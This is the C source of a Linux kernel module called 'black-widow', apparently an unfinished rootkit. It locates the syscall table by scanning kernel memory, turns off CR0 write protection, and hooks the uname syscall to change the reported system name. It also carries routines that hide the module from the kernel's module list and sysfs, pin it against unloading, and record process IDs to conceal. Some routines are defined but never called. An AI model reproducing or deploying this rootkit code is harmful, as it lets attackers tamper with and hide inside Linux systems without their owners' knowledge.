/*
 * =====================================================================================
 *
 *       Filename:  black-widow.c
 *
 *    Description:  main src file
 *
 *        Version:  1.0
 *        Created:  03/27/2015 01:43:28 AM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  samy shehata
 *   Organization:  
 *
 * =====================================================================================
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/seq_file.h>
#include <linux/vmalloc.h>
#include <linux/fs.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <asm/syscall.h>
#include <linux/utsname.h>
#include <linux/namei.h>
#include <asm/uaccess.h>
#include <linux/kdev_t.h>
#include <linux/stat.h>
#include <asm/stat.h>

MODULE_LICENSE("GPL");

#define PROTECTED_FLAG 0x10000

static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
static char pid_list[10][32];
static int last_proc = -1;
static unsigned long **_sys_call_table = NULL;
static int failed = 0;

static asmlinkage long (*org_uname) (struct new_utsname *);
static asmlinkage long (*org_read) (int, void*, size_t);
static asmlinkage long (*org_stat) (const char __user *filename, struct __old_kernel_stat __user *statbuf);

asmlinkage long uname(struct new_utsname *name) {
  org_uname(name);
  strcpy(name->sysname, "Feel The Widow's Bite");
  return 0;
} 

static void find_sctable(void) {
  unsigned long **sctable = NULL;
  unsigned long ptr;

  for ( ptr = PAGE_OFFSET;
      ptr < ULLONG_MAX;
      ptr += sizeof(void *)) {
    unsigned long *p;
    p = (unsigned long *)ptr;
    if (p[__NR_close] == (unsigned long) sys_close) {
      sctable = (unsigned long **)p;
      _sys_call_table = &sctable[0];
      break;
    }
  }
  if (_sys_call_table == NULL)
    failed = 1;
}

static inline void memorize(void) {
  prev_entry = THIS_MODULE->list.prev;
  find_sctable();

  struct __old_kernel_stat buf;
  char dev[50];
  sys_fstat("/proc/net/tcp", &buf);
  print_dev_t(dev, buf.st_dev);

  org_uname = _sys_call_table[__NR_uname];
  org_read = _sys_call_table[__NR_read];
}

static inline void vanish(void) {
  list_del(&THIS_MODULE->list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del(&THIS_MODULE->mkobj.kobj.entry);

  kfree(THIS_MODULE->notes_attrs);
  THIS_MODULE->notes_attrs = NULL;
  kfree(THIS_MODULE->sect_attrs);
  THIS_MODULE->sect_attrs = NULL;
  kfree(THIS_MODULE->mkobj.mp);
  THIS_MODULE->mkobj.mp = NULL;
  THIS_MODULE->modinfo_attrs->attr.name = NULL;
  kfree(THIS_MODULE->mkobj.drivers_dir);
  THIS_MODULE->mkobj.drivers_dir = NULL;
}

static inline void appear(void) {
  list_add(&THIS_MODULE->list, prev_entry);
}

static inline void protect(void) {
  try_module_get(THIS_MODULE);
}

static inline void release(void) {
  module_put(THIS_MODULE);
}

static inline void clear_write_permission(void) {
  unsigned long cr0;
  __asm__("mov %%cr0, %0" : "=r" (cr0));
  __asm__("mov %0, %%cr0" : : "r" (cr0 & ~PROTECTED_FLAG)); 
}

static inline void set_write_permission(void) {
  unsigned long cr0;
  __asm__("mov %%cr0, %0" : "=r" (cr0));
  __asm__("mov %0, %%cr0" : : "r" (cr0 | PROTECTED_FLAG)); 
}

static inline void hide_proc(char* pid) {
  if (last_proc == 9)
    return;
  strcpy(pid_list[++last_proc], pid);
}

// on module load
static int __init load_module(void) {
  memorize(); 
  if (failed)
    return 0;

  clear_write_permission();
  _sys_call_table[__NR_uname] = uname;
  return 0;
}

// on module unload
static void __exit cleanup(void) {
  if (failed)
    return;

  _sys_call_table[__NR_uname] = org_uname;
  set_write_permission();
  return;
}

module_init(load_module);
module_exit(cleanup);
